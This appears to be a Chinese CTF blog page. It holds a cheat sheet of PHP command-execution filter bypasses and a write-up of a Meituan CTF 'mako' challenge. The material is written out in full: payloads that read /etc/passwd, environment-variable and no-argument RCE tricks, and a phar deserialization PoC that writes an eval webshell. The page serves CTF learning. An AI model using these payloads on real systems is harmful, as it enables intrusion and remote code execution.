<h1 id="0x01-常见命令执行函数"><a href="#0x01-常见命令执行函数" class="headerlink" title="0x01 常见命令执行函数"></a>0x01 常见命令执行函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP代码执行函数：</span><br><span class="line">eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()...</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP命令执行函数：</span><br><span class="line">system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()...</span><br></pre></td></tr></table></figure>

<h1 id="0x02-Bypass"><a href="#0x02-Bypass" class="headerlink" title="0x02 Bypass"></a>0x02 Bypass</h1><h2 id="1-关键词拦截"><a href="#1-关键词拦截" class="headerlink" title="1.关键词拦截:"></a>1.关键词拦截:</h2><ul>
<li><p>关键词替换为空的情况:</p>
<ul>
<li>双写绕过，比如<code>cacatt</code> -&gt; <code>cat</code></li>
</ul>
</li>
<li><p>仅拦截关键字:</p>
<ul>
<li><p>使用其他函数，比如拦截<code>cat</code>的时候，可以使用其他命令。</p>
<table>
<thead>
<tr>
<th align="left">Input</th>
<th align="left">Ouput</th>
</tr>
</thead>
<tbody><tr>
<td align="left">static-sh .&#x2F;flag.txt</td>
<td align="left">.&#x2F;flag.txt: line 1: flag{this_is_a_test}: not found</td>
</tr>
<tr>
<td align="left">paste .&#x2F;flag.txt &#x2F;etc&#x2F;passwd</td>
<td align="left">flag{this_is_a_test} root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash…</td>
</tr>
<tr>
<td align="left">diff</td>
<td align="left">diff .&#x2F;flag.txt &#x2F;etc&#x2F;passwd</td>
</tr>
<tr>
<td align="left">curl file:&#x2F;&#x2F;&#x2F;home&#x2F;coffee&#x2F;flag</td>
<td align="left">flag{this_is_a_test}</td>
</tr>
<tr>
<td align="left">…</td>
<td align="left">…</td>
</tr>
</tbody></table>
</li>
<li><p>通配符绕过，比如可以使用<code>/b??/c?t f*</code>。<strong>该方法有时候会因为输出过多或者运行时间超出限制被强行中断</strong></p>
</li>
<li><p>插入<code>&quot;&quot;</code> <code>&lt;&gt;</code> <code>&#39;&#39;</code> <code>\</code>绕过,比如<code>ca&#39;&#39;t flag.txt</code>或者<code>ca\t flag.txt</code></p>
</li>
<li><p>内联执行，将反引号内命令的输出作为输入执行,如: cat `ls`，或者是<code>cat $&#123;ls&#125;</code></p>
</li>
<li><p>使用变量替换，如<code>$c=a;cat fl$cg.php</code></p>
</li>
</ul>
</li>
<li><p>拦截空格,空格可以用以下字符串代替：</p>
<blockquote>
<p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等，比如:</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt   </span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure></li>
<li><p><code>.</code>操作符<br>  eval函数中用<code>.</code>把被拦截的关键字给分开，比如</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">eval</span>(<span class="keyword">include</span> <span class="string">&quot;/www/lo&quot;</span>.<span class="string">&quot;g/nginx/access.log&quot;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>逃逸，绕过太难了，直接润出来<br>比如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span> </span><br><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])    </span><br></pre></td></tr></table></figure>
</li>
<li><p>借壳生蛋</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$env</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$env</span>))&#123;</span><br><span class="line">      <span class="title function_ invoke__">putenv</span>(<span class="variable">$env</span>);</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>   ?env&#x3D;BASH_FUNC_whoami%%&#x3D;() { ls; }<br><code>whoami</code>是<code>system(“whoami”)</code>启动的bash环境的函数，相当于我们注册了一个<code>whoami</code>替换它</p>
</blockquote>
</li>
<li><p>构造<br> 在PHP7中，可以这样调用函数:</p>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;phpinfo&#x27;)();</span><br><span class="line">$a = &quot;phpinfo&quot;;$$a;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>  然后就可以使用异或<code>^</code>,取反<code>~</code>，自增<code>++</code>，自减<code>--</code>等方法构造想要的字符然后进行动态函数调用。</p>
<p>  构造字符的时候，可以利用一些PHP的特性：</p>
<ul>
<li><code>PHP中的NAN和INF：</code>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。</span><br><span class="line"></span><br><span class="line">INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。</span><br><span class="line"></span><br><span class="line">$_=C/C;//NAN</span><br><span class="line">$_=1/C//INF</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="2-无回显"><a href="#2-无回显" class="headerlink" title="2.无回显"></a>2.无回显</h2><ul>
<li><p>利用<code>sleep()</code>之类的函数来根据服务器响应的时间一个一个字符获获取<br><strong>注:该方法局限性很大，且容易受到网络波动影响，不建议优先考虑使用</strong></p>
</li>
<li><p>利用dns外带<code>http://dnslog.cn/</code><br><strong>注:该方法也有一定的局限性，有长度限制而且不支持特殊字符</strong></p>
</li>
<li><p>利用重定向，将输出重定向到可访问网页中</p>
</li>
<li><p>反弹<code>shell</code><br><strong>如果题目不出网只能寄</strong></p>
</li>
<li><p>命令注入,尝试在命令后面加上<code>||</code>、<code>%0a</code>、<code>%0d</code>、<code>|</code>、<code>;</code>、<code>&amp;</code>等符号将原先重定向到<code>/dev/null</code>的命令分割开</p>
</li>
</ul>
<h2 id="3-include"><a href="#3-include" class="headerlink" title="3.include"></a>3.include</h2><ul>
<li>伪协议</li>
<li>日志包含<br>UA写马,包含<code>access.log</code></li>
<li>allow_url_include&#x3D;ture可以使用的data<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data类型扩展:</span><br><span class="line"></span><br><span class="line">  data类型扩展</span><br><span class="line">  data:,&lt;文本数据&gt;</span><br><span class="line">  data:text/plain,&lt;文本数据&gt;</span><br><span class="line">  data:text/html,&lt;HTML代码&gt;</span><br><span class="line">  data:text/html;base64,&lt;base64编码的HTML代码&gt;</span><br><span class="line">  data:text/css,&lt;CSS代码&gt;</span><br><span class="line">  data:text/css;base64,&lt;base64编码的CSS代码&gt;</span><br><span class="line">  data:text/javascript,&lt;Javascript代码&gt;</span><br><span class="line">  data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;</span><br><span class="line">  data:image/gif;base64,base64编码的gif图片数据</span><br><span class="line">  data:image/png;base64,base64编码的png图片数据</span><br><span class="line">  data:image/jpeg;base64,base64编码的jpeg图片数据</span><br><span class="line">  data:image/x-icon;base64,base64编码的icon图片数据</span><br></pre></td></tr></table></figure>
<strong>Tips:</strong> PHP具有极强的鲁棒性<del>特别耐操</del>，尤其是伪协议这块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">原payload:php://filter/convert.base64-encode/resource=index.php</span><br><span class="line"></span><br><span class="line">我可以插♂ 入一些奇怪的东西</span><br><span class="line">php://filter/convert.base64-encode/114514/resource=index.php</span><br><span class="line"></span><br><span class="line">我可以大大小小</span><br><span class="line">php://FiLTer/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="4-无参命令执行"><a href="#4-无参命令执行" class="headerlink" title="4.无参命令执行"></a>4.无参命令执行</h2><p>这种就基本没活能整了，已经十分固定下来了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>&#39;/[^\W]+\((?R)?\)/&#39;</code>的解释</p>
<p>  这里使用pregreplace替换匹配到的字符为空，\w匹配字母、数字和下划线，等价于 [^A-Za-z0-9]，然后(?R)?这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有;</p>
<p>  以上正则表达式只匹配a(b(c()))或a()这种格式，不匹配a(“123”)，也就是说我们传入的值函数不能带有参数，所以我们要使用无参数的函数进行文件读取或者命令执行。</p>
</li>
<li><p>一些有用的东西</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">目录操作：</span><br><span class="line">getchwd() ：函数返回当前工作目录。</span><br><span class="line">scandir() ：函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">数组相关的操作：</span><br><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">array_shift() - 删除数组中第一个元素，并返回被删除元素的值。</span><br><span class="line"></span><br><span class="line">读文件</span><br><span class="line"></span><br><span class="line">show_source() - 对文件进行语法高亮显示。</span><br><span class="line">readfile() - 输出一个文件。</span><br><span class="line">highlight_file() - 对文件进行语法高亮显示。</span><br><span class="line">file_get_contents() - 把整个文件读入一个字符串中。</span><br><span class="line">readgzfile() - 可用于读取非 gzip 格式的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="PAYLOAD"><a href="#PAYLOAD" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h4><ol>
<li><p>请求头</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /1.php?code=eval(end(getallheaders())); HTTP/1.1</span><br><span class="line">.....</span><br><span class="line">flag: system(&#x27;id&#x27;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>get_defined_vars()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;flag=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
<p>利用全局变量进RCE</p>
</li>
</ol>
<p><code>get_defined_vars()</code>：返回由所有已定义变量所组成的数组，会返回  <code>_GET</code>,<code>_POST</code>,  <code>_COOKIE</code>, <code>_FILES</code>全局变量的值，返回数组顺序为<code>get</code>-&gt;<code>post</code>-&gt;<code>cookie</code>-&gt;<code>files</code><br><code>current</code>：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回<code>$_GET</code>变量的数组值</p>
<p>3.session_start()</p>
<ul>
<li><p>session_start()：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id()</p>
</li>
<li><p>session_id()：获取&#x2F;设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。<br>文件读取</p>
</li>
<li><p><code>show_source(session_id(session_start()));</code></p>
</li>
<li><p><code>var_dump(file_get_contents(session_id(session_start())))</code></p>
</li>
<li><p><code>highlight_file(session_id(session_start()));</code></p>
</li>
<li><p><code>readfile(session_id(session_start()));</code><br>抓包传入Cookie: PHPSESSID&#x3D;(想读的文件)即可</p>
</li>
</ul>
</div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/CTF/">CTF</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/WEB/">WEB</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/RCE/">RCE</a></div><hr></div></article></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-09-30  <a class="commentCountImg" href="/2022/09/30/mt-ctf/#comment-container"><span class="display-none-class">3d1e750c6339ffe1cc4722514124ebbf</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="3d1e750c6339ffe1cc4722514124ebbf">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>5 分钟  <i class="fas fa-pencil-alt"> </i>0.8 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/09/30/mt-ctf/">美团CTF决赛复现 mako</a></h1><div class="content"><p>太菜了，被大佬带进决赛了,最后就签个到</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p><a target="_blank" rel="noopener" href="https://wwn.lanzouw.com/ipBju0cnr5ha">密码:1skr</a></p>
<p><strong>下面部分是我在比赛的时候思考过的</strong></p>
<h1 id="1-开始"><a href="#1-开始" class="headerlink" title="1.开始"></a>1.开始</h1><p>页面一进来，十分的清爽，毛都没有，就一个上传文件的东西<br><img src="/images/mt-ctf/1.png"></p>
<p>随便传点东西，发现是来者不拒，啥都能传，但啥都干不了<br><img src="/images/mt-ctf/2.png"><br>访问<code>1.php</code>只会出现<code>404not found</code>这是最令人异或的一点</p>
<p>因为题目给了docker，就本地部署一个环境，先进去看看文件都存到了哪里<br><img src="/images/mt-ctf/3.png"><br>可以看见，文件并没有被上传到<code>/var/www/html/</code>这个目录下面</p>
<p>而文件被上传到了<code>/var/www/html/mako/uploads</code>这个目录下<br><img src="/images/mt-ctf/4.png"></p>
<p>可以肯定的是，文件上传是整不了活了</p>
<h1 id="2-审计"><a href="#2-审计" class="headerlink" title="2.审计"></a>2.审计</h1><p>通过搜索关键词，在<code>mako/app/reources/views/home.tpl.php</code>里找到到了首页的源码<br><img src="/images/mt-ctf/5.png"></p>
<p>很明显，这是用模版渲染出来的主页, 图片都是以base64的编码形式传递的，没活整了。</p>
<p>这就很令人苦恼，我当时尝试了一下，使用软链接<br><img src="/images/mt-ctf/6.png"><br><img src="/images/mt-ctf/7.png"></p>
<p>直接寄了，没权限，这时候才想起来容器一开始写了一个读取flag的程序</p>
<p>目标也明确了，肯定得想办法执行<code>readFlag</code>，于是我搜了危险函数，然后是一无所获，要么没这个函数，要么根本无法触发</p>
<p>做到这里，我已经没有思路了，当时想到了反序列化，但是只知道搜<code>unseralize</code>，结果是毛都没搜到。</p>
<p>我经验太少了，当时没想到用<code>phar</code></p>
<h1 id="3-复现"><a href="#3-复现" class="headerlink" title="3.复现"></a>3.复现</h1><p>在<code>mako/app/controllers/ImagesController.php</code>文件中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editGet</span>(<span class="params">ViewFactory <span class="variable">$view</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/var/www/mako/uploads&#x27;</span>);</span><br><span class="line">	<span class="variable">$fileName</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getQuery</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;filename&#x27;</span>);</span><br><span class="line">	<span class="variable">$image</span> = <span class="keyword">new</span> <span class="title class_">Image</span>(<span class="variable">$fileName</span>, <span class="keyword">new</span> <span class="title class_">ImageMagick</span>());</span><br><span class="line">	<span class="variable">$dimensions</span> = <span class="variable">$image</span>-&gt;<span class="title function_ invoke__">getDimensions</span>();</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;fileName&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;view-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;dimensions&#x27;</span>, <span class="variable">$dimensions</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$view</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;edit&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，文件名是不做任何过滤的</p>
<p>而在<code>mako/vendo/mako/framework/src/mako/pixl/image.php</code>中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$image</span>, ProcessorInterface <span class="variable">$processor</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;image = <span class="variable">$image</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable language_">$this</span>-&gt;processor = <span class="variable">$processor</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Make sure that the image exists</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;image) === <span class="literal">false</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PixlException</span>(<span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;The image [ %s ] does not exist.&#x27;</span>, [<span class="variable">$this</span>-&gt;image]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Set the image</span></span><br><span class="line"></span><br><span class="line">	<span class="variable language_">$this</span>-&gt;processor-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$image</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用了能触发<code>phar</code>反序列化的<code>file_exists</code>函数</p>
<p>关键函数找到了，现在找链子吧</p>
<p>搜索<code>__destruct()</code>,干扰项不多，可以直接开撸</p>
<p><img src="/images/mt-ctf/9.png"></p>
<p>好家伙，我直接好家伙，一条龙服务了属于是qwq</p>
<p><img src="/images/mt-ctf/10.png"></p>
<h1 id="4-攻击"><a href="#4-攻击" class="headerlink" title="4.攻击"></a>4.攻击</h1><p>这里搬一手Arr3stY0u战队的poc吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">mako</span>\<span class="title class_">file</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">FileSystem</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">mako</span>\<span class="title class_">session</span>\<span class="title class_">stores</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">mako</span>\<span class="title class_">file</span>\<span class="title class_">FileSystem</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fileSystem</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$sessionPath</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fileSystem = <span class="keyword">new</span> <span class="title class_">FileSystem</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sessionPath = <span class="string">&#x27;/var/www/mako/public/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">mako</span>\<span class="title class_">session</span>&#123;</span><br><span class="line"><span class="title class_">use</span> <span class="title class_">mako</span>\<span class="title class_">session</span>\<span class="title class_">stores</span>\<span class="title class_">File</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$autoCommit</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$destroyed</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$sessionId</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$sessionData</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;autoCommit = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;destroyed = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sessionId = <span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sessionData = [<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> <span class="title class_">mako</span>\<span class="title class_">session</span>\<span class="title class_">Session</span>();</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$exp</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;text.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上传文件<br><img src="/images/mt-ctf/11.png"><br>getshell<br><img src="/images/mt-ctf/12.png"><br>flag is here<br><img src="/images/mt-ctf/13.png"></p>
<h1 id="5-总结反思"><a href="#5-总结反思" class="headerlink" title="5.总结反思"></a>5.总结反思</h1><p>经验不足，做题不够，欠练</p>
</div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/CTF/">CTF</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/WEB/">WEB</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/%E5%A4%8D%E7%8E%B0/">复现</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/phar/">phar</a></div><hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-09-29  <a class="commentCountImg" href="/2022/09/29/i-love-hexo/#comment-container"><span class="display-none-class">4cdcd8cf07f42a12f4e54a86f8722da4</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="4cdcd8cf07f42a12f4e54a86f8722da4">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>几秒  <i class="fas fa-pencil-alt"> </i>0.0 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/09/29/i-love-hexo/">How sfc9982 helped me solve hexo problem</a></h1><div class="content"><h1 id="How-sfc9982-helped-me-solve-hexo-problem"><a href="#How-sfc9982-helped-me-solve-hexo-problem" class="headerlink" title="How sfc9982 helped me solve hexo problem"></a>How sfc9982 helped me solve hexo 